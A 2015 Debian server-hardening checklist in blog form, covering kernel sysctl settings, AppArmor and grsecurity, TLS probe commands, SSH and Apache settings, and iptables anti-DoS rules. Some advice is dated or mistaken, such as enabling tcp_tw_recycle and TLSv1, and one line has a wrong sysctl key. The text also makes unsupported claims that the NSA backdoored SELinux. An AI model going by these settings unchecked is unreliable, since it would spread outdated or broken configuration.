&lt;p&gt;** TIME-WAIT status can be reuse, the default is disable( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_tw_reuse = 1
/proc/sys/net/ipv4/tcp_tw_reuse
&lt;/pre&gt;

&lt;p&gt;** fast recycle of TIME-WAIT status connection, the default is disable( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_tw_recycle = 1
/proc/sys/net/ipv4/tcp_tw_recycle
&lt;/pre&gt;

&lt;p&gt;** TCP KEEPALIVE probe frequency,the default is 7,200 seconds:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_keepalive_time = 300
/proc/sys/net/ipv4/tcp_keepalive_time
&lt;/pre&gt;

&lt;p&gt;** TCP KEEPALIVE probe packets, the default is 9:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_keepalive_probes = 3
/proc/sys/net/ipv4/tcp_keepalive_probes
&lt;/pre&gt;

&lt;p&gt;** how many times of SYN and SYN+ACK can be re-transimit, the default is 5:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_syn_retries = 3
/proc/sys/net/ipv4/tcp_syn_retries

net.ipv4.tcp_synack_retries = 3 
/proc/sys/net/ipv4/tcp_synack_retries
&lt;/pre&gt;

&lt;p&gt;** the bigger value of TCP ORPHAN would prevent simple DoS attack,
   each ORPHAN cost 64KB memory, so 65535 is about 4GB:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_orphans = 65536
/proc/sys/net/ipv4/tcp_max_orphans
&lt;/pre&gt;

&lt;p&gt;** How many pages( 4KB each page in x86) can be used in TCP connection:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_mem = 131072 196608 262144
/proc/sys/net/ipv4/tcp_mem
&lt;/pre&gt;

&lt;p&gt;Be careful about this one, it’d be triggered OOM if the TCP connection
consume all pages.&lt;/p&gt;

&lt;p&gt;** The maximum send and receive window, you can set 64MB for a 10G NIC:&lt;/p&gt;

&lt;pre&gt;
net.core.rmem_max = 67108864
/proc/sys/net/core/rmem_max

net.core.wmem_max = 67108864
/proc/sys/net/core/wmem_max
&lt;/pre&gt;

&lt;p&gt;** Each TCP connection’s read buffer( X bytes):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_rmem = 4096 8192 16777216( 4096 87380 33554432)
/proc/sys/net/ipv4/tcp_rmem

net.ipv4.tcp_wmem = 4096 8192 16777216( 4096 65536 33554432)
/proc/sys/net/ipv4/tcp_wmem
&lt;/pre&gt;

&lt;p&gt;If default paging 8kb * 2 = 16kb/connection, 4GB memory can be used for:
(4 * 1024 * 1024) / 16 = 262144&lt;/p&gt;

&lt;p&gt;Oracle DB server’s &lt;a href=&quot;http://www.dba-oracle.com/t_linux_networking_kernel_parameters.htm&quot;&gt;best practice&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Networking&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ref:
https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;

&lt;p&gt;** Source Routing is used to specify a path or route through the
network from source to destination. This feature can be used by
network people for diagnosing problems. However, if an intruder was
able to send a source routed packet into the network, then he could
intercept the replies and your server might not know that it’s not
communicating with a trusted server.&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.accept_source_route = 0
/proc/sys/net/ipv4/conf/all/accept_source_route
&lt;/pre&gt;

&lt;p&gt;** ICMP redirects are used by routers to tell the server that there is
   a better path to other networks than the one chosen by the
   server. However, an intruder could potentially use ICMP redirect
   packets to alter the hosts’s routing table by causing traffic to
   use a path you didn’t intend.&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.accept_redirects = 0
/proc/sys/net/ipv4/conf/all/accept_redirects
&lt;/pre&gt;

&lt;p&gt;** Turn it off if this is not a router：&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

/proc/sys/net/ipv4/conf/all/send_redirects
/proc/sys/net/ipv4/conf/default/send_redirects
&lt;/pre&gt;

&lt;p&gt;** IP spoofing protection, the default is disabled( 0)：&lt;/p&gt;
&lt;pre&gt;
net.ipv4.conf.all.rp_filter = 1
/proc/sys/net/ipv4/conf/all/rp_filter
&lt;/pre&gt;

&lt;p&gt;** If you want to ignore all ICMP package, you can enable it. The
   default is disabled( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_echo_ignore_all = 1
/proc/sys/net/ipv4/icmp_echo_ignore_all
&lt;/pre&gt;

&lt;p&gt;** Ignore ICMP broadcast, the default is enabled( 1):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_echo_ignore_broadcasts = 1
/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
&lt;/pre&gt;

&lt;p&gt;** To alert you about bad message, the default is disabled( 1):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_ignore_bogus_error_responses = 1
/proc/sys/net/ipv4/icmp_ignore_bogus_error_responses
&lt;/pre&gt;

&lt;p&gt;** To turn on logging for Spoofed Packets, Source Routed Packets, and
   Redirect Packets, the default is disabled( 0):&lt;/p&gt;

&lt;pre&gt;
/proc/sys/net/ipv4/conf/all/log_martians
net.ipv4.conf.all.log_martians = 1
&lt;/pre&gt;

&lt;h2 id=&quot;exploit-mitigation&quot;&gt;Exploit mitigation&lt;/h2&gt;
&lt;p&gt;** Randomize the memory area. 0: disable ASLR. 1: Randomize the stack,
   VDSO page, shared memory regions. 2: (1) + also randomize the data
   segment.&lt;/p&gt;

&lt;pre&gt;
kernel.randomize_va_space=2
/proc/sys/kernel/randomize_va_space
&lt;/pre&gt;

&lt;p&gt;** Not allow the user to read kernel address symbol tables:&lt;/p&gt;
&lt;pre&gt;
kernel.kptr_restrict=1
/proc/sys/kernel/kptr_restrict
&lt;/pre&gt;

&lt;p&gt;** dmesg info can be read by root-only:&lt;/p&gt;
&lt;pre&gt;
kernel.kptr_restrict=1
/proc/sys/kernel/dmesg_restrict
&lt;/pre&gt;

&lt;p&gt;** the minimal memory map address, 65536 is good at least:&lt;/p&gt;
&lt;pre&gt;
vm.mmap_min_addr=65536
/proc/sys/vm/mmap_min_addr
&lt;/pre&gt;

&lt;p&gt;** Now allow the debugger trace the process by ptrace. The current
   Debian stable kernel doesn’t have this feature. 0: All process can
   be debugged. 1: Only one father process can be debugged. 2: Only
   &lt;em&gt;root&lt;/em&gt; can do debug( with CAP_SYS_PTRACE) 3: no process can be
   debugged&lt;/p&gt;
&lt;pre&gt;
kernel.yama.ptrace_scope = 2
/proc/sys/kernel/yama/ptrace_scope
&lt;/pre&gt;

&lt;h3 id=&quot;apparmor&quot;&gt;—-[ 3.1 Apparmor&lt;/h3&gt;

&lt;p&gt;Why Apparmor? It’s easy to deploy. More importantly, it’s easy to
audit the polices. Everyone can write your own MAC/RBAC
policy. Debian/OpenSuSE shipped with Apparmor by default.&lt;/p&gt;

&lt;p&gt;Install Apparmor and MAC polices from community:
#apt-get install -y apparmor-profiles apparmor&lt;/p&gt;

&lt;p&gt;Check the status:
#aa-status&lt;/p&gt;

&lt;h3 id=&quot;selinux&quot;&gt;—-[ 3.2 SELinux&lt;/h3&gt;

&lt;p&gt;S0rry. I barely use SELinux for reasons. The 1st one is I don’t trust
NSA, even the source code is GPL’ed. NSA is professional about
&lt;em&gt;implant&lt;/em&gt; backdoors, which would be very hard to audit. People has
been discussing it for years:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.schneier.com/blog/archives/2008/04/nsas_linux.html&quot;&gt;NSA SELinux&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.zerohedge.com/news/2013-07-09/nsa-has-inserted-its-code-android-os-bugging-three-quarters-all-smartphones&quot;&gt;NSA has inserted its code into Android&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.eteknix.com/nsa-has-code-running-in-the-linux-kernel-and-android/&quot;&gt;NSA linux/android kernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sebastian Krahmer found a &lt;a href=&quot;https://github.com/stealth/troubleshooter&quot;&gt;exploitable bug&lt;/a&gt; from SELinux recently. It looks like a backdoor more than a “vulnerablity”, isn’t it?;-)
Another important reason people don’t like SELinux because it’s hard
to use and cause other application troubles from time to time. &lt;a href=&quot;http://stopdisablingselinux.com/&quot;&gt;Stop
disabling SELinux&lt;/a&gt; movement won’t work in the near future:&lt;/p&gt;

&lt;p&gt;S0rry, Mr.Walsh. It’s nothing personal:-)&lt;/p&gt;

&lt;h3 id=&quot;mempo-kernel&quot;&gt;—-[ 3.3 Mempo kernel&lt;/h3&gt;

&lt;p&gt;”“⌘ Mempo project aims to provide most secure and yet comfortable
out-of-the-box Desktop and Server computer, for professionals,
business, journalists, and every-day users avoiding PRISM-like
spying. ⌘”&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://wiki.debian.org/Mempo&quot;&gt;Mempo&lt;/a&gt; is a FLOSS project for protect user’s digital freedom. Let the
massive surveillance cry;-)&lt;/p&gt;

&lt;p&gt;The Debian Mempo repo is not working for the internet user now and
it’ll be back soon. So I’ll write how to use PaX/Grsecurity from
offical Mempo repository on Debian.&lt;/p&gt;

&lt;h3 id=&quot;paxgrsecurity&quot;&gt;—-[ 3.3.1 PaX/Grsecurity&lt;/h3&gt;

&lt;p&gt;PaX/Grsecurity is the cutting-edge kernel protection in past 14
years. But they don’t have the credit what they supposed to
have. Almost every main stream OS kernel security mechanism has
influenced by PaX/Grsecurity in past decade. Lionel tells a &lt;a href=&quot;http://www.openwall.com/lists/oss-security/2014/12/06/14&quot;&gt;little story&lt;/a&gt; about PaX/Grsecurity better than myself:&lt;/p&gt;

&lt;p&gt;PaX/Grsecurity treat the kernel security as a whole. They’ve been
inventing many innovations( SEGMEXEC, PAGEEXEC, MPROTECT, UDEREF,
RANDSTRUCT&lt;em&gt;, etc), while hardening the kernel in source code level(
make important *struct&lt;/em&gt; read-only, etc). PaX/Grsecurity is one of most
respected 0ld sch00l hacker community. The main contributor( Spender)
was even been through a &lt;a href=&quot;http://developers.slashdot.org/story/04/05/31/1949241/end-of-development-for-grsecurity-announced&quot;&gt;very badly economic situation&lt;/a&gt; back in 2004&lt;/p&gt;

&lt;p&gt;Thanks to the G0d of techn0logy, PaX/Grsecurity is still alive…. I
personally agree with some ideas:&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;“The “better than none” point of view is actually a nice way to false
sense of security for those who don’t know better. We got
better-than-none apparmor, selinux, tomoyo, some poorly maintained and
crippled ports of grsec features or alikes, namespaces and containers,
rootkit-friendly LSM, the dumb and useless kernel version of SSP,
etc. What’s the sum of all this shit for end users? False sense of
security…”&lt;/p&gt;

&lt;p&gt;“without Grsecurity/PaX, linux security is like monkey can never
perform a regular masturbation cu’z lacking of giant pennis;-)”
———————————————————————–&lt;/p&gt;

&lt;p&gt;Too many better-than-none product or solutions, which only makes you
feel safe, maybe for a while. Feel safe is not equal to
secure. Fuc*ing cargo cult shitty security only makes things worse.&lt;/p&gt;

&lt;p&gt;I’ll show you how to install PaX/Grsecurity manually( still waiting
Mempo back online):&lt;/p&gt;

&lt;p&gt;** &lt;a href=&quot;https://www.kernel.org/pub/linux/kernel/v3.x/&quot;&gt;Download kernel&lt;/a&gt; ( Pick one)：
https://www.kernel.org/pub/linux/kernel/v3.x/&lt;/p&gt;

&lt;p&gt;** Download &lt;a href=&quot;https://grsecurity.net/download.php&quot;&gt;PaX/Grsecurity patch&lt;/a&gt; ( you can download the latest version
   from )：&lt;/p&gt;

&lt;p&gt;** Decompress the kernel and patch the kernel with grsecurity:&lt;/p&gt;
&lt;pre&gt;
xz -d linux-*.tar.xz
tar xvf linux-*.tar
cd linux-*/
patch -p1 &amp;lt; ../grsecurity-*.patch
&lt;/pre&gt;

&lt;p&gt;** Do “make menuconfig” to customize your kernel, or you can use &lt;a href=&quot;https://raw.githubusercontent.com/citypw/citypw-SCFE/master/security/apparmor_test/debian-7.4-linux-3.14.1-grsec.config&quot;&gt;my test config&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;** Compile&lt;/p&gt;
&lt;pre&gt;
make -j7 deb-pkg
&lt;/pre&gt;

&lt;p&gt;** Install the new kernel&lt;/p&gt;
&lt;pre&gt;
dpkg -i ../*.deb
&lt;/pre&gt;

&lt;h2 id=&quot;crypto&quot;&gt;–[ 4. Crypto&lt;/h2&gt;

&lt;p&gt;“Encryption works. Properly implemented strong crypto systems are one
of the few things that you can rely on. Unfortunately, endpoint
security is so terrifically weak that NSA can frequently find ways
around it.”   — Edward Snowden&lt;/p&gt;

&lt;p&gt;Damn, we should treat the crypto engineering very carefully. Because
it may be the last outter-heaven we have;-)&lt;/p&gt;

&lt;p&gt;—-[ 4.1 SSL/TLS Checklist&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.exploresecurity.com/wp-content/uploads/custom/SSL_manual_cheatsheet.html&quot;&gt;Very good writing&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SSL/TLS has been through BEAST/CRIME/LUCKY-13/HEARTBLEED/POODLE in
past few years. and it’s already become one of hottest topic in cyber
security. There are a set of vulnerable protocols and ciphersuites are
worth to do audit. There are a few open source tools would make your
audit work easier. Try this one:&lt;/p&gt;

&lt;pre&gt;
#apt-get install sslscan


SSLv2 should be disabled:
openssl s_client -ssl2 -connect www.google.com:443

OpenSSL 1.0 no longer support SSLv2. So you can use GnuTLS do the
check:

gnutls-cli -d 5 -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.1:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com
&lt;/pre&gt;

&lt;p&gt;FREAK:&lt;/p&gt;
&lt;pre&gt;
openssl s_client -cipher EXPORT -connect www.google.com:443
&lt;/pre&gt;

&lt;p&gt;If succeed, it’s risk to FREAK.&lt;/p&gt;

&lt;p&gt;—-[ 4.2 OpenSSH&lt;/p&gt;

&lt;p&gt;Config file：/etc/ssh/ssh_config&lt;/p&gt;

&lt;pre&gt;
1, known_hosts stores server's signature, so hash the host name:

HashKnownHosts yes

2, SSH protocl version 1 is not secure:

Protocol 2

3, If you don't use X11 forwarding, plz disable it&quot;

X11Forwarding no

4, Disable rhosts:

IgnoreRhosts yes

5, Not allow empty password:

PermitEmptyPasswords no

6, Maxisum tries:

MaxAuthTries 5

7, Now allow root login:

PermitRootLogin no


(Optional)
1, disable password auth, enable pubkey auth:

PubkeyAuthentication yes

PasswordAuthentication no


2，Allow or deny users/groups

AllowGroups, AllowUsers, DenyUsers, DenyGroups
&lt;/pre&gt;

&lt;h3 id=&quot;openssh-in-post-prism-era&quot;&gt;——[ 4.2.1 OpenSSH in post-prism era&lt;/h3&gt;

&lt;p&gt;Well, plz &lt;a href=&quot;https://stribika.github.io/2015/01/04/secure-secure-shell.html&quot;&gt;read this&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ciphersuites-in-apache2nginx&quot;&gt;—-[ 4.2 Ciphersuites in Apache2/Nginx&lt;/h3&gt;

&lt;p&gt;The explanation is &lt;a href=&quot;https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Apache:
SSLProtocol ALL -SSLv2 -SSLv3
SSLHonorCipherOrder On
SSLCipherSuite ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;

&lt;p&gt;Nginx:
ssl_prefer_server_ciphers On;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;

&lt;p&gt;–[ 5. Web security&lt;/p&gt;

&lt;p&gt;You’re not reading this article for learning pentest, are you? Let’s
just consider the fence of defender’s;-)&lt;/p&gt;

&lt;p&gt;OWASP code review:
https://www.owasp.org/images/2/2e/OWASP_Code_Review_Guide-V1_1.pdf
https://www.owasp.org/index.php/OWASP_Code_review_V2_Project&lt;/p&gt;

&lt;p&gt;OWASP testing guide:
https://www.owasp.org/images/5/52/OWASP_Testing_Guide_v4.pdf
https://www.owasp.org/index.php/OWASP_Guide_Project&lt;/p&gt;

&lt;p&gt;—-[ 5.1 Web server( Apache/Nginx ?)&lt;/p&gt;

&lt;p&gt;ServerRoot&lt;/p&gt;
&lt;pre&gt;
Web server's root path. Default is &quot;/etc/httpd&quot;. It's import to keep
track of its permission. Recommend: Do not allow none-root user has
the permission to modify it.

chown root:root /etc/httpd
chmod 754 /etc/httpd
&lt;/pre&gt;

&lt;p&gt;Timeout&lt;/p&gt;
&lt;pre&gt;
Lifetime per session. Default is 60 seconds. Set the lower value for
mitigating DoS attack. Recommend: 15 &amp;lt;= X &amp;lt;= 30
&lt;/pre&gt;

&lt;p&gt;KeepAlive&lt;/p&gt;
&lt;pre&gt;
Persistent session. Default is “Off”. Recommend: On
&lt;/pre&gt;

&lt;p&gt;User&lt;/p&gt;
&lt;pre&gt;
Decide which user Apache work process running as. Recommend: nobody
&lt;/pre&gt;

&lt;p&gt;Group&lt;/p&gt;
&lt;pre&gt;
Decide which group Apache work process running as. Recommend: nobody
&lt;/pre&gt;

&lt;p&gt;Blacklist/whitelist IP/networks&lt;/p&gt;
&lt;pre&gt;
Order Deny,Allow
Deny from all
Allow from 176.16.0.0/16

Or by IP:

Order Deny,Allow
Deny from all
Allow from 127.0.0.1
&lt;/pre&gt;

&lt;p&gt;Blacklist/whitelist web contents&lt;/p&gt;
&lt;pre&gt;
It can prevent malicious attack via web content.

&amp;lt; Directory /&amp;gt;
Order Deny,Allow # Default is Allow
Deny from all  # Deny all contents
&amp;lt; /Directory&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Options FollowSymLinks&lt;/p&gt;
&lt;pre&gt;
Do not list any other files if the visited file don't exit.
&lt;/pre&gt;

&lt;p&gt;Hide info&lt;/p&gt;
&lt;pre&gt;
ServerSignature:
* Off, do not provide any information
* On, provide Apache infomation

ServerTokens:
* Full, exposure all information
* Prod, only provide server name
&lt;/pre&gt;

&lt;p&gt;Limit risky HTTP methods&lt;/p&gt;
&lt;pre&gt;
&amp;lt; Directory /&amp;gt;
&amp;lt; LimitExcept GET POST&amp;gt;
Deny from all
&amp;lt; /LimitExcept&amp;gt;
&amp;lt; /Directory&amp;gt;

PUT/DELETE/etc methods won't be available.
&lt;/pre&gt;

&lt;p&gt;MinSpareServers&lt;/p&gt;
&lt;pre&gt;
Minimal spare processes. Default is 5. Recommend: 32.
&lt;/pre&gt;

&lt;p&gt;MaxSpareServers&lt;/p&gt;
&lt;pre&gt;
Maximum spare processes. Default is 20. Recommend: 64.
&lt;/pre&gt;

&lt;p&gt;ServerLimit&lt;/p&gt;
&lt;pre&gt;
The number that MaxClients can't not exceed.
&lt;/pre&gt;

&lt;p&gt;MaxClients&lt;/p&gt;
&lt;pre&gt;
The maximum number of working processes. Default is 256. Recommend:
8192.

MaxClients = (RAM available to Apache) / (RAM per Apache process)

RAM per Apache process:
#ps -ylC httpd --sort:rss

Example:
64GB physical memory * 0.8 = RAM available to Apache
HTML &amp;lt;= 5MB per process, PHP &amp;lt;= 15MB per processe
php: MaxClients = 65536MB / 15MB =4369
&lt;/pre&gt;

&lt;p&gt;MaxRequestsPerChild&lt;/p&gt;
&lt;pre&gt;
Limit on the number of requests that an individual child server will
handle during its life. Default is 4000. Recommend: 1500.
&lt;/pre&gt;

&lt;p&gt;—-[ 5.2 WAF&lt;/p&gt;

&lt;p&gt;ModSecurity is an open source, cross-platform web application firewall
(WAF) module. Known as the “Swiss Army Knife” of WAFs, it enables web
application defenders to gain visibility into HTTP(S) traffic and
provides a power rules language and API to implement advanced
protections. The web malicious signatures( including OWASP Top 10) are
maintained by ModSecurity community. You can &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-set-up-mod_security-with-apache-on-debian-ubuntu&quot;&gt;deploy it on Debian&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Anti-DoS: &lt;a href=&quot;https://www.linode.com/docs/websites/apache-tips-and-tricks/modevasive-on-apache&quot;&gt;mod_evasive&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;About anti DoS solution, I personally don’t get used to
mod_evasive. Iptables would be much easier to maintain, eg:&lt;/p&gt;
&lt;pre&gt;
iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --update --seconds 30 --hitcount 5 -j DROP
&lt;/pre&gt;

&lt;p&gt;–[ 6. Security standard&lt;/p&gt;

&lt;p&gt;Well, there are a bunch of crazy security standards in the
planet. Some are compliance in some contries. FIPS-140-2/3, CC( EAL 7?
damn, it’d be an incarnation of the organge book;-)), PCI-DSS are very
popular terms you might hear from your security consultant. But… due
to lack of engineering implementation, these crazy( &amp;amp; creepy?)
security standards are not our concerns here.&lt;/p&gt;

&lt;p&gt;—-[ 6.1 STIGs for Debian&lt;/p&gt;

&lt;p&gt;Once there’s history, there’s story about offense &amp;amp; defense. Once
we’ve heard fascinating stories from Mr.Sn0wden about how NSA fuck the
world, there should be some open information about how BIG-BROTHER do
the defense. &lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is one of them.&lt;/p&gt;

&lt;p&gt;I think I’m not the right person to write this section…..plz &lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/06/19/STIG-4-Debian.html&quot;&gt;check this out&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;–[ 7. Reference&lt;/p&gt;

&lt;p&gt;[1] Back To The Future: Unix Wildcards Gone Wild
    http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&lt;/p&gt;

&lt;p&gt;[2] SYNPROXY
    http://lwn.net/Articles/563151/&lt;/p&gt;

&lt;p&gt;[3] DDoS protection Using Netfilter/iptables
    http://people.netfilter.org/hawk/presentations/devconf2014/iptables-ddos-mitigation_JesperBrouer.pdf&lt;/p&gt;

&lt;p&gt;[4] INTERNET PROTOCOL
    http://tools.ietf.org/html/rfc791&lt;/p&gt;

&lt;p&gt;[5] A simple TCP spoofing attack
    http://www.citi.umich.edu/u/provos/papers/secnet-spoof.txt&lt;/p&gt;

&lt;p&gt;[6] ICMP Attacks Illustrated
    http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477&lt;/p&gt;

&lt;p&gt;[7] SUSE Linux Enterprise Server 11 SP3 - Security and Hardening
    https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;

&lt;p&gt;[8] Securing Debian Manual 
    https://www.debian.org/doc/manuals/securing-debian-howto/&lt;/p&gt;

&lt;p&gt;[9] A Brief Introduction to auditd
    http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/&lt;/p&gt;

&lt;p&gt;[10] Apparmor RBAC
     http://wiki.apparmor.net/index.php/Pam_apparmor_example&lt;/p&gt;

&lt;p&gt;[11] Hardening PHP from php.ini
     http://www.madirish.net/199&lt;/p&gt;

&lt;p&gt;[12] CVE-2014-0196 exploit
http://bugfuzz.com/stuff/cve-2014-0196-md.c&lt;/p&gt;

&lt;p&gt;[13] Secure Secure Shell
https://stribika.github.io/2015/01/04/secure-secure-shell.html&lt;/p&gt;

&lt;p&gt;[14] STIGs
     http://iase.disa.mil/stigs/Pages/index.aspx
     http://iase.disa.mil/stigs/os/unix-linux/Pages/index.aspx&lt;/p&gt;
</description>
        <pubDate>Wed, 10 Jun 2015 06:48:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/06/10/debian-security-chklist.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/10/debian-security-chklist.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
  </channel>
</rss>
